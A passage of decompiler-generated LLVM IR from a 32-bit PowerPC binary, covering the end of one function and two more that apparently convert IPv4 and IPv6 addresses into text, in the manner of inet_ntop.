  %v2_10013548 = inttoptr i32 %v0_1001353c to i32*
  store i32 97, i32* %v2_10013548, align 4
  %v0_10013558.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013554

dec_label_pc_10013550:                            ; preds = %dec_label_pc_10013444, %dec_label_pc_10013438, %dec_label_pc_100133fc, %dec_label_pc_10013424, %dec_label_pc_100134e0, %dec_label_pc_10013484, %dec_label_pc_10013470, %dec_label_pc_1001351c, %dec_label_pc_100133c4, %dec_label_pc_100134bc, %dec_label_pc_10013478
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013554

dec_label_pc_10013554:                            ; preds = %dec_label_pc_1001353c, %dec_label_pc_10013524, %dec_label_pc_1001338c, %dec_label_pc_10013550
  %v0_10013558 = phi i32 [ %v0_10013558.pre, %dec_label_pc_1001353c ], [ 1, %dec_label_pc_10013524 ], [ %v3_10013394, %dec_label_pc_1001338c ], [ 0, %dec_label_pc_10013550 ]
  store i32 %v0_10013364, i32* %r0.global-to-local, align 4
  store i32 %v0_10013558, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013558

; uselistorder directives
  uselistorder i32 %v0_10013558, { 1, 0 }
  uselistorder i32 %v2_10013508, { 1, 0 }
  uselistorder i32 %v0_10013504.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1001351c, { 1, 0 }
  uselistorder i32 %v0_1001351c.pre, { 1, 0 }
  uselistorder i32 %v0_100134c8, { 1, 0 }
  uselistorder i32 %v0_1001351c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_100134a8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10013450, { 1, 0 }
  uselistorder i32 %v1_10013400, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 1, 2, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 14, 15, 11, 12, 3, 2, 13, 5, 4, 16, 17, 1, 18, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @function_10014108, { 2, 1, 0 }
  uselistorder i32 268514476, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_10013280, { 1, 0 }
  uselistorder label %dec_label_pc_10013554, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013550, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10013524, { 1, 0 }
  uselistorder label %dec_label_pc_100134f8, { 1, 0 }
  uselistorder label %dec_label_pc_100134d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100134b4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100133dc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_100133dc, { 1, 0 }
}

define i32 @function_1001356c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100135c4.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10013570 = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10013594 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10013594, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_100135a8.846 to i32), i32* @lr, align 4
  %v3_100135a4 = call i32 @function_1000dd4c(i32 %v2_10013594, i32 0, i32 15)
  store i32 %v3_100135a4, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_100136682 = load i32, i32* @r1, align 4
  store i32 %v0_100136682, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100135c4

dec_label_pc_100135c4:                            ; preds = %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge, %dec_label_pc_100135c4.lr.ph
  %v2_100135e4 = phi i32 [ %v2_10013668, %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge ], [ %v0_100136682, %dec_label_pc_100135c4.lr.ph ]
  %v0_100135d4 = phi i32 [ %v0_10013668, %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge ], [ %v0_100136682, %dec_label_pc_100135c4.lr.ph ]
  %v0_100135c8 = phi i32 [ %v1_10013668, %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge ], [ 0, %dec_label_pc_100135c4.lr.ph ]
  %v1_100135d0 = phi i32 [ %v1_100135c4.pre, %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge ], [ 0, %dec_label_pc_100135c4.lr.ph ]
  %v0_100135c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100135c4 = add i32 %v0_100135c4, %v1_100135d0
  %v3_100135c4 = inttoptr i32 %v2_100135c4 to i8*
  %v4_100135c4 = load i8, i8* %v3_100135c4, align 1
  %v5_100135c4 = zext i8 %v4_100135c4 to i32
  store i32 %v5_100135c4, i32* %r10.global-to-local, align 4
  store i32 %v0_100135c8, i32* %r8.global-to-local, align 4
  %v1_100135cc = add i32 %v0_100135c8, 1
  store i32 %v1_100135cc, i32* %r11.global-to-local, align 4
  store i32 %v2_100135c4, i32* %r3.global-to-local, align 4
  %v2_100135d4 = add i32 %v1_100135cc, %v0_100135d4
  store i32 %v2_100135d4, i32* %r6.global-to-local, align 4
  %v1_100135d8 = load i32, i32* @r28, align 4
  %v2_100135d8 = udiv i32 %v5_100135c4, %v1_100135d8
  %v1_100135dc = add nuw nsw i32 %v2_100135d8, 48
  %v1_100135e0 = urem i32 %v1_100135dc, 256
  store i32 %v1_100135e0, i32* %r0.global-to-local, align 4
  %v1_100135e4 = trunc i32 %v1_100135dc to i8
  %v3_100135e4 = add i32 %v2_100135e4, 8
  %v4_100135e4 = inttoptr i32 %v3_100135e4 to i8*
  store i8 %v1_100135e4, i8* %v4_100135e4, align 1
  %v0_100135e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_100135e8 = icmp eq i32 %v0_100135e8, 48
  %v0_100135f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100135f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_100135f0 = udiv i32 %v0_100135f0, %v1_100135f0
  store i32 %v2_100135f0, i32* %r9.global-to-local, align 4
  br i1 %v3_100135e8, label %dec_label_pc_100135f0, label %dec_label_pc_1001361c

dec_label_pc_100135f0:                            ; preds = %dec_label_pc_100135c4
  %v2_100135f4 = udiv i32 %v2_100135f0, %v1_100135f0
  %tmp18 = mul i32 %v2_100135f4, -10
  %v2_100135fc = add i32 %v2_100135f0, 48
  %v1_10013600 = add i32 %v2_100135fc, %tmp18
  store i32 %v1_10013600, i32* %r9.global-to-local, align 4
  %v1_10013604 = urem i32 %v1_10013600, 256
  store i32 %v1_10013604, i32* %r0.global-to-local, align 4
  %v1_10013608 = trunc i32 %v1_10013600 to i8
  %v2_10013608 = load i32, i32* %r7.global-to-local, align 4
  %v3_10013608 = add i32 %v2_10013608, 8
  %v4_10013608 = inttoptr i32 %v3_10013608 to i8*
  store i8 %v1_10013608, i8* %v4_10013608, align 1
  %v0_1001360c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001360c = icmp eq i32 %v0_1001360c, 48
  br i1 %v3_1001360c, label %dec_label_pc_10013638, label %dec_label_pc_10013614

dec_label_pc_10013614:                            ; preds = %dec_label_pc_100135f0
  %v0_10013614 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10013614, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013638

dec_label_pc_1001361c:                            ; preds = %dec_label_pc_100135c4
  %v0_10013620 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013620 = add i32 %v0_10013620, 1
  store i32 %v1_10013620, i32* %r8.global-to-local, align 4
  %v2_10013624 = udiv i32 %v2_100135f0, %v1_100135f0
  %v1_10013628 = mul i32 %v2_10013624, 10
  store i32 %v1_10013628, i32* %r0.global-to-local, align 4
  %v2_1001362c = sub i32 %v2_100135f0, %v1_10013628
  %v1_10013630 = add i32 %v2_1001362c, 48
  store i32 %v1_10013630, i32* %r9.global-to-local, align 4
  %v1_10013634 = trunc i32 %v1_10013630 to i8
  %v2_10013634 = load i32, i32* %r6.global-to-local, align 4
  %v3_10013634 = add i32 %v2_10013634, 8
  %v4_10013634 = inttoptr i32 %v3_10013634 to i8*
  store i8 %v1_10013634, i8* %v4_10013634, align 1
  br label %dec_label_pc_10013638

dec_label_pc_10013638:                            ; preds = %dec_label_pc_100135f0, %dec_label_pc_10013614, %dec_label_pc_1001361c
  %v0_10013638 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013638 = inttoptr i32 %v0_10013638 to i8*
  %v2_10013638 = load i8, i8* %v1_10013638, align 1
  %v3_10013638 = zext i8 %v2_10013638 to i32
  %v0_1001363c = load i32, i32* %r8.global-to-local, align 4
  %v1_1001363c = add i32 %v0_1001363c, 1
  %v0_10013640 = load i32, i32* @r1, align 4
  %v2_10013640 = add i32 %v0_10013640, %v0_1001363c
  store i32 %v2_10013640, i32* %r10.global-to-local, align 4
  %v2_10013644 = add i32 %v1_1001363c, %v0_10013640
  store i32 %v2_10013644, i32* %r8.global-to-local, align 4
  %v0_10013648 = load i32, i32* %r4.global-to-local, align 4
  %v1_10013648 = add i32 %v0_10013648, 1
  store i32 %v1_10013648, i32* %r4.global-to-local, align 4
  %v1_1001364c = add i32 %v0_1001363c, 2
  store i32 %v1_1001364c, i32* %r11.global-to-local, align 4
  %v1_10013650 = load i32, i32* %r5.global-to-local, align 4
  %v2_10013650 = udiv i32 %v3_10013638, %v1_10013650
  %v1_10013654 = mul nuw nsw i32 %v2_10013650, 10
  store i32 %v1_10013654, i32* %r0.global-to-local, align 4
  %v2_10013658 = sub nsw i32 %v3_10013638, %v1_10013654
  %v1_1001365c = add nsw i32 %v2_10013658, 48
  store i32 %v1_1001365c, i32* %r9.global-to-local, align 4
  %v1_10013660 = trunc i32 %v1_1001365c to i8
  %v3_10013660 = add i32 %v2_10013640, 8
  %v4_10013660 = inttoptr i32 %v3_10013660 to i8*
  store i8 %v1_10013660, i8* %v4_10013660, align 1
  %v0_10013664 = load i32, i32* %r12.global-to-local, align 4
  %v1_10013664 = trunc i32 %v0_10013664 to i8
  %v2_10013664 = load i32, i32* %r8.global-to-local, align 4
  %v3_10013664 = add i32 %v2_10013664, 8
  %v4_10013664 = inttoptr i32 %v3_10013664 to i8*
  store i8 %v1_10013664, i8* %v4_10013664, align 1
  %v0_10013668 = load i32, i32* @r1, align 4
  %v1_10013668 = load i32, i32* %r11.global-to-local, align 4
  %v2_10013668 = add i32 %v1_10013668, %v0_10013668
  store i32 %v2_10013668, i32* %r7.global-to-local, align 4
  %v0_1001366c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001366c = add i32 %v0_1001366c, -1
  store i32 %v1_1001366c, i32* %ctr.global-to-local, align 4
  %v2_1001366c = icmp eq i32 %v1_1001366c, 0
  br i1 %v2_1001366c, label %dec_label_pc_10013670, label %dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge

dec_label_pc_10013638.dec_label_pc_100135c4_crit_edge: ; preds = %dec_label_pc_10013638
  %v1_100135c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100135c4

dec_label_pc_10013670:                            ; preds = %dec_label_pc_10013638
  %v2_10013670 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10013670, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013678 = add i32 %v1_10013668, %v2_10013670
  store i32 %v2_10013678, i32* %r9.global-to-local, align 4
  store i32 %v2_10013670, i32* @r3, align 4
  %v3_10013680 = add i32 %v2_10013678, -1
  %v4_10013680 = inttoptr i32 %v3_10013680 to i8*
  store i8 0, i8* %v4_10013680, align 1
  %v0_10013684 = call i32 @function_1000df60()
  store i32 %v0_10013684, i32* %r3.global-to-local, align 4
  %v1_10013688 = load i32, i32* @r30, align 4
  %v3_10013688 = icmp ugt i32 %v0_10013684, %v1_10013688
  br i1 %v3_10013688, label %dec_label_pc_10013690, label %dec_label_pc_100136a4

dec_label_pc_10013690:                            ; preds = %dec_label_pc_10013670
  %v0_10013690 = call i32 @function_1000c85c()
  store i32 %v0_10013690, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001369c = inttoptr i32 %v0_10013690 to i32*
  store i32 28, i32* %v2_1001369c, align 4
  %v0_100136b8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100136b4

dec_label_pc_100136a4:                            ; preds = %dec_label_pc_10013670
  %v0_100136a4 = load i32, i32* @r29, align 4
  store i32 %v0_100136a4, i32* %r3.global-to-local, align 4
  store i32 %v2_10013670, i32* %r4.global-to-local, align 4
  %v2_100136ac = bitcast i16* %stack_var_-56 to i8*
  %v3_100136ac = call i32 @function_1000df40(i32 %v0_100136a4, i8* %v2_100136ac)
  store i32 %v3_100136ac, i32* %r3.global-to-local, align 4
  store i32 %v3_100136ac, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100136b4

dec_label_pc_100136b4:                            ; preds = %dec_label_pc_10013690, %dec_label_pc_100136a4
  %v0_100136b8 = phi i32 [ %v0_100136b8.pre, %dec_label_pc_10013690 ], [ %v3_100136ac, %dec_label_pc_100136a4 ]
  store i32 %v0_10013570, i32* %r0.global-to-local, align 4
  store i32 %v0_100136b8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100136b8

; uselistorder directives
  uselistorder i32 %v0_100136b8, { 1, 0 }
  uselistorder i32 %v2_10013670, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001366c, { 1, 0 }
  uselistorder i32 %v2_10013668, { 1, 0 }
  uselistorder i32 %v0_1001363c, { 1, 0, 2 }
  uselistorder i32 %v3_10013638, { 1, 0 }
  uselistorder i32 %v1_10013600, { 1, 0, 2 }
  uselistorder i32 %v2_100135f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_100135dc, { 1, 0 }
  uselistorder i32 %v0_100135c8, { 1, 0 }
  uselistorder i32 %v0_100136682, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 15, { 0, 3, 7, 8, 1, 6, 9, 5, 2, 4 }
  uselistorder i32 268566528, { 21, 27, 24, 22, 25, 26, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 10, 13, 9, 14, 15, 16, 17, 18, 19, 20, 0, 23 }
  uselistorder label %dec_label_pc_100136b4, { 1, 0 }
  uselistorder label %dec_label_pc_10013638, { 2, 1, 0 }
}

define i32 @function_100136cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100136cc:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_100136d4 = icmp slt i32 %arg1, 2
  %v3_100136d4 = icmp eq i32 %arg1, 2
  store i1 %v1_100136d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100136d4, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_100136d4, label %dec_label_pc_100136fc, label %dec_label_pc_100136f0

dec_label_pc_100136f0:                            ; preds = %dec_label_pc_100136cc
  %v1_100136f0 = icmp slt i32 %arg1, 10
  %v3_100136f0 = icmp eq i32 %arg1, 10
  store i1 %v1_100136f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100136f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100136f0, label %dec_label_pc_10013734.lr.ph, label %dec_label_pc_10013948

dec_label_pc_100136fc:                            ; preds = %dec_label_pc_100136cc
  store i32 ptrtoint (i32* @global_var_1001370c.848 to i32), i32* @lr, align 4
  %v3_10013708 = call i32 @function_1001356c(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10013940

dec_label_pc_10013734.lr.ph:                      ; preds = %dec_label_pc_100136f0
  %v2_10013710 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10013710, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013724.849 to i32), i32* @lr, align 4
  %v3_10013720 = call i32 @function_1000dd4c(i32 %v2_10013710, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001375415 = load i32, i32* @r27, align 4
  store i32 %v0_1001375415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013734

dec_label_pc_10013734:                            ; preds = %dec_label_pc_10013734.lr.ph, %dec_label_pc_10013734
  %v1_10013748 = phi i32 [ 0, %dec_label_pc_10013734.lr.ph ], [ %v1_10013758, %dec_label_pc_10013734 ]
  %v0_10013734 = phi i32 [ %v0_1001375415, %dec_label_pc_10013734.lr.ph ], [ %v0_10013754, %dec_label_pc_10013734 ]
  %v0_1001373c = phi i32 [ %v0_1001375415, %dec_label_pc_10013734.lr.ph ], [ %v2_10013754, %dec_label_pc_10013734 ]
  %v1_10013734 = phi i32 [ 0, %dec_label_pc_10013734.lr.ph ], [ %v0_1001374c, %dec_label_pc_10013734 ]
  %v2_10013734 = add i32 %v0_10013734, %v1_10013734
  %v3_10013734 = inttoptr i32 %v2_10013734 to i8*
  %v4_10013734 = load i8, i8* %v3_10013734, align 1
  %v5_10013734 = zext i8 %v4_10013734 to i32
  %v1_10013738 = add i32 %v1_10013734, 2
  store i32 %v1_10013738, i32* %r11.global-to-local, align 4
  %v1_1001373c = add i32 %v0_1001373c, 1
  %v2_1001373c = inttoptr i32 %v1_1001373c to i8*
  %v3_1001373c = load i8, i8* %v2_1001373c, align 1
  %v4_1001373c = zext i8 %v3_1001373c to i32
  %v1_10013740 = mul nuw nsw i32 %v5_10013734, 256
  %v2_10013744 = or i32 %v4_1001373c, %v1_10013740
  %v2_10013748 = load i32, i32* %r29.global-to-local, align 4
  %v3_10013748 = add i32 %v2_10013748, %v1_10013748
  %v4_10013748 = inttoptr i32 %v3_10013748 to i32*
  store i32 %v2_10013744, i32* %v4_10013748, align 4
  %v0_1001374c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001374c = udiv i32 %v0_1001374c, 2
  %v0_10013754 = load i32, i32* @r27, align 4
  %v2_10013754 = add i32 %v0_10013754, %v0_1001374c
  store i32 %v2_10013754, i32* %r9.global-to-local, align 4
  %v1_10013758 = mul i32 %v1_1001374c, 4
  %v0_1001375c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001375c = add i32 %v0_1001375c, -1
  store i32 %v1_1001375c, i32* %ctr.global-to-local, align 4
  %v2_1001375c = icmp eq i32 %v1_1001375c, 0
  br i1 %v2_1001375c, label %dec_label_pc_1001377c.lr.ph, label %dec_label_pc_10013734

dec_label_pc_1001377c.lr.ph:                      ; preds = %dec_label_pc_10013734
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001377c

dec_label_pc_1001377c:                            ; preds = %dec_label_pc_1001377c.lr.ph, %dec_label_pc_100137c8
  %v0_100137cc = phi i32 [ 8, %dec_label_pc_1001377c.lr.ph ], [ %v1_100137cc, %dec_label_pc_100137c8 ]
  %v0_100137bc = phi i32 [ -1, %dec_label_pc_1001377c.lr.ph ], [ %v0_100137bc42, %dec_label_pc_100137c8 ]
  %v0_100137ac = phi i32 [ -1, %dec_label_pc_1001377c.lr.ph ], [ %v0_100137ac39, %dec_label_pc_100137c8 ]
  %v0_10013780 = phi i32 [ -1, %dec_label_pc_1001377c.lr.ph ], [ %v0_1001378035, %dec_label_pc_100137c8 ]
  %v0_100137c8 = phi i32 [ 0, %dec_label_pc_1001377c.lr.ph ], [ %v1_100137c8, %dec_label_pc_100137c8 ]
  %v1_1001377c = mul i32 %v0_100137c8, 4
  %v3_10013780 = icmp eq i32 %v0_10013780, -1
  %v2_10013784 = add i32 %v1_1001377c, %v2_10013710
  %v3_10013784 = inttoptr i32 %v2_10013784 to i32*
  %v4_10013784 = load i32, i32* %v3_10013784, align 4
  %v3_10013788 = icmp eq i32 %v4_10013784, 0
  br i1 %v3_10013788, label %dec_label_pc_10013790, label %dec_label_pc_100137a8

dec_label_pc_10013790:                            ; preds = %dec_label_pc_1001377c
  br i1 %v3_10013780, label %dec_label_pc_10013794, label %dec_label_pc_100137a0

dec_label_pc_10013794:                            ; preds = %dec_label_pc_10013790
  store i32 %v0_100137c8, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_100137c8

dec_label_pc_100137a0:                            ; preds = %dec_label_pc_10013790
  %v0_100137a0 = load i32, i32* @r31, align 4
  %v1_100137a0 = add i32 %v0_100137a0, 1
  store i32 %v1_100137a0, i32* @r31, align 4
  br label %dec_label_pc_100137c8

dec_label_pc_100137a8:                            ; preds = %dec_label_pc_1001377c
  br i1 %v3_10013780, label %dec_label_pc_100137c8, label %dec_label_pc_100137ac

dec_label_pc_100137ac:                            ; preds = %dec_label_pc_100137a8
  %v3_100137ac = icmp eq i32 %v0_100137ac, -1
  %v0_100137c0.pre = load i32, i32* @r31, align 4
  %v1_100137b4 = load i32, i32* @r30, align 4
  %v3_100137b4 = icmp sgt i32 %v0_100137c0.pre, %v1_100137b4
  %or.cond = or i1 %v3_100137ac, %v3_100137b4
  br i1 %or.cond, label %dec_label_pc_100137bc, label %dec_label_pc_100137c4

dec_label_pc_100137bc:                            ; preds = %dec_label_pc_100137ac
  store i32 %v0_100137bc, i32* @r28, align 4
  store i32 %v0_100137c0.pre, i32* @r30, align 4
  br label %dec_label_pc_100137c4

dec_label_pc_100137c4:                            ; preds = %dec_label_pc_100137ac, %dec_label_pc_100137bc
  %v0_100137ac40 = phi i32 [ %v0_100137bc, %dec_label_pc_100137bc ], [ %v0_100137ac, %dec_label_pc_100137ac ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100137c8

dec_label_pc_100137c8:                            ; preds = %dec_label_pc_100137a8, %dec_label_pc_100137a0, %dec_label_pc_10013794, %dec_label_pc_100137c4
  %v0_100137bc42 = phi i32 [ %v0_100137bc, %dec_label_pc_100137a8 ], [ %v0_100137bc, %dec_label_pc_100137a0 ], [ %v0_100137c8, %dec_label_pc_10013794 ], [ -1, %dec_label_pc_100137c4 ]
  %v0_1001378035 = phi i32 [ -1, %dec_label_pc_100137a8 ], [ %v0_10013780, %dec_label_pc_100137a0 ], [ %v0_100137c8, %dec_label_pc_10013794 ], [ -1, %dec_label_pc_100137c4 ]
  %v0_100137ac39 = phi i32 [ %v0_100137ac, %dec_label_pc_100137a8 ], [ %v0_100137ac, %dec_label_pc_100137a0 ], [ %v0_100137ac, %dec_label_pc_10013794 ], [ %v0_100137ac40, %dec_label_pc_100137c4 ]
  %v1_100137c8 = add nuw nsw i32 %v0_100137c8, 1
  store i32 %v1_100137c8, i32* %r11.global-to-local, align 4
  %v1_100137cc = add nsw i32 %v0_100137cc, -1
  store i32 %v1_100137cc, i32* %ctr.global-to-local, align 4
  %v2_100137cc = icmp eq i32 %v1_100137cc, 0
  br i1 %v2_100137cc, label %dec_label_pc_100137d0, label %dec_label_pc_1001377c

dec_label_pc_100137d0:                            ; preds = %dec_label_pc_100137c8
  %v3_100137d0 = icmp eq i32 %v0_100137bc42, -1
  %v1_100137f0 = icmp slt i32 %v0_100137ac39, -1
  %v3_100137f0 = icmp eq i32 %v0_100137ac39, -1
  store i1 %v1_100137f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100137d0, label %dec_label_pc_100137f0, label %dec_label_pc_100137d8

dec_label_pc_100137d8:                            ; preds = %dec_label_pc_100137d0
  %v0_100137e8.pre = load i32, i32* @r31, align 4
  br i1 %v3_100137f0, label %dec_label_pc_100137e8, label %dec_label_pc_100137e0

dec_label_pc_100137e0:                            ; preds = %dec_label_pc_100137d8
  %v1_100137e0 = load i32, i32* @r30, align 4
  %v2_100137e0 = icmp slt i32 %v0_100137e8.pre, %v1_100137e0
  %v3_100137e0 = icmp sgt i32 %v0_100137e8.pre, %v1_100137e0
  %v4_100137e0 = icmp eq i32 %v0_100137e8.pre, %v1_100137e0
  store i1 %v2_100137e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100137e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100137e0, label %dec_label_pc_100137e8, label %dec_label_pc_100137f0.thread

dec_label_pc_100137e8:                            ; preds = %dec_label_pc_100137d8, %dec_label_pc_100137e0
  store i32 %v0_100137e8.pre, i32* @r30, align 4
  store i32 %v0_100137bc42, i32* @r28, align 4
  br label %dec_label_pc_100137f0.thread

dec_label_pc_100137f0.thread:                     ; preds = %dec_label_pc_100137e8, %dec_label_pc_100137e0
  %v0_100137f876 = phi i32 [ %v1_100137e0, %dec_label_pc_100137e0 ], [ %v0_100137e8.pre, %dec_label_pc_100137e8 ]
  %v0_100137f0.ph = phi i32 [ %v0_100137ac39, %dec_label_pc_100137e0 ], [ %v0_100137bc42, %dec_label_pc_100137e8 ]
  %v1_100137f059 = icmp slt i32 %v0_100137f0.ph, -1
  %v3_100137f061 = icmp eq i32 %v0_100137f0.ph, -1
  store i1 %v1_100137f059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137f061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100137f8

dec_label_pc_100137f0:                            ; preds = %dec_label_pc_100137d0
  br i1 %v3_100137f0, label %dec_label_pc_10013804, label %dec_label_pc_100137f0.dec_label_pc_100137f8_crit_edge

dec_label_pc_100137f0.dec_label_pc_100137f8_crit_edge: ; preds = %dec_label_pc_100137f0
  %v0_100137f8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100137f8

dec_label_pc_100137f8:                            ; preds = %dec_label_pc_100137f0.dec_label_pc_100137f8_crit_edge, %dec_label_pc_100137f0.thread
  %v0_100137f8 = phi i32 [ %v0_100137f876, %dec_label_pc_100137f0.thread ], [ %v0_100137f8.pre, %dec_label_pc_100137f0.dec_label_pc_100137f8_crit_edge ]
  %v0_100137f062 = phi i32 [ %v0_100137f0.ph, %dec_label_pc_100137f0.thread ], [ %v0_100137ac39, %dec_label_pc_100137f0.dec_label_pc_100137f8_crit_edge ]
  %v1_100137f8 = icmp slt i32 %v0_100137f8, 1
  %v2_100137f8 = icmp sgt i32 %v0_100137f8, 1
  %v3_100137f8 = icmp eq i32 %v0_100137f8, 1
  store i1 %v1_100137f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100137f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100137f8, label %dec_label_pc_10013804, label %dec_label_pc_10013800

dec_label_pc_10013800:                            ; preds = %dec_label_pc_100137f8
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10013804

dec_label_pc_10013804:                            ; preds = %dec_label_pc_100137f8, %dec_label_pc_100137f0, %dec_label_pc_10013800
  %v0_100138103 = phi i32 [ %v0_100137f062, %dec_label_pc_100137f8 ], [ -1, %dec_label_pc_100137f0 ], [ -1, %dec_label_pc_10013800 ]
  %v2_10013804 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10013804, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_100138104 = icmp slt i32 %v0_100138103, -1
  %v3_100138106 = icmp eq i32 %v0_100138103, -1
  store i1 %v1_100138104, i1* %cr7_lt.global-to-local, align 1
